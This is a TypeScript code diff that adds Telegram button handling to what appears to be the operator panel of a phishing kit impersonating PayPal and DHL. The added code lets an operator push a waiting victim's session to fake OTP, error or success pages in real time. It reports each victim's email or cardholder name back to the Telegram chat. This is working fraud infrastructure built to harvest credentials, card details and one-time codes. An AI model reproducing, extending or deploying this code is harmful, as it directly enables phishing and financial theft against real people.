@@ -17,6 +17,23 @@ interface TelegramUpdate {
     date: number;
     text?: string;
   };
+  callback_query?: {
+    id: string;
+    from: {
+      id: number;
+      is_bot: boolean;
+      first_name: string;
+      username?: string;
+    };
+    message?: {
+      message_id: number;
+      chat: {
+        id: number;
+        type: string;
+      };
+    };
+    data?: string;
+  };
 }
 
 let lastUpdateId = 0;
@@ -70,6 +87,13 @@ async function pollTelegramUpdates(botToken: string) {
 }
 
 async function handleTelegramUpdate(update: TelegramUpdate, botToken: string) {
+  // Handle callback queries (button clicks)
+  if (update.callback_query) {
+    await handleCallbackQuery(update.callback_query, botToken);
+    return;
+  }
+
+  // Handle text messages (commands)
   const message = update.message;
   if (!message || !message.text) return;
 
@@ -209,6 +233,98 @@ async function handleDhlRedirectCommand(
       botToken,
       `❌ Erreur lors de la redirection.`
     );
+  }
+}
+
+async function handleCallbackQuery(query: any, botToken: string) {
+  const data = query.data;
+  const chatId = query.message?.chat.id;
+  
+  if (!data || !chatId) return;
+
+  try {
+    // Parse callback data: format is "type_action_sessionId"
+    const [type, action, sessionId] = data.split('_');
+    
+    // Route button mappings
+    const routeMap: Record<string, string> = {
+      // PayPal routes
+      'paypal_error': '/paypal/failure',
+      'paypal_approve': '/paypal/otp',
+      'paypal_otp': '/paypal/otp',
+      'paypal_success': '/paypal/success',
+      'paypal_home': '/',
+      
+      // DHL routes
+      'dhl_error': '/error',
+      'dhl_approve': '/otp1',
+      'dhl_otp': '/otp1',
+      'dhl_otp_error': '/otp-error',
+      'dhl_success': '/success',
+      'dhl_loading': '/dhl/waiting',
+      'dhl_home': '/',
+    };
+
+    const redirectUrl = routeMap[`${type}_${action}`];
+    
+    if (!redirectUrl) {
+      await answerCallbackQuery(query.id, botToken, "❌ Action inconnue");
+      return;
+    }
+
+    // Handle redirect based on type
+    if (type === 'paypal') {
+      const session = await storage.getPaypalSession(sessionId);
+      if (!session || session.status !== 'waiting') {
+        await answerCallbackQuery(query.id, botToken, "⚠️ Session déjà traitée");
+        return;
+      }
+
+      await storage.updatePaypalSession(sessionId, {
+        redirectUrl,
+        status: "redirected",
+      });
+
+      await answerCallbackQuery(query.id, botToken, `✅ Client redirigé vers ${action.toUpperCase()}`);
+      await sendReply(chatId, botToken, `✅ Client <code>${session.email}</code> redirigé vers <b>${action.toUpperCase()}</b>`);
+      
+    } else if (type === 'dhl') {
+      const session = await storage.getDhlSession(sessionId);
+      if (!session || session.status !== 'waiting') {
+        await answerCallbackQuery(query.id, botToken, "⚠️ Session déjà traitée");
+        return;
+      }
+
+      await storage.updateDhlSession(sessionId, {
+        redirectUrl,
+        status: "redirected",
+      });
+
+      await answerCallbackQuery(query.id, botToken, `✅ Client redirigé vers ${action.toUpperCase()}`);
+      await sendReply(chatId, botToken, `✅ Client <code>${session.cardholderName}</code> redirigé vers <b>${action.toUpperCase()}</b>`);
+    }
+    
+  } catch (error) {
+    console.error("Failed to handle callback query:", error);
+    await answerCallbackQuery(query.id, botToken, "❌ Erreur");
+  }
+}
+
+async function answerCallbackQuery(queryId: string, botToken: string, text: string) {
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        callback_query_id: queryId,
+        text,
+        show_alert: false,
+      }),
+    });
+  } catch (error) {
+    console.error("Failed to answer callback query:", error);
   }
 }
 
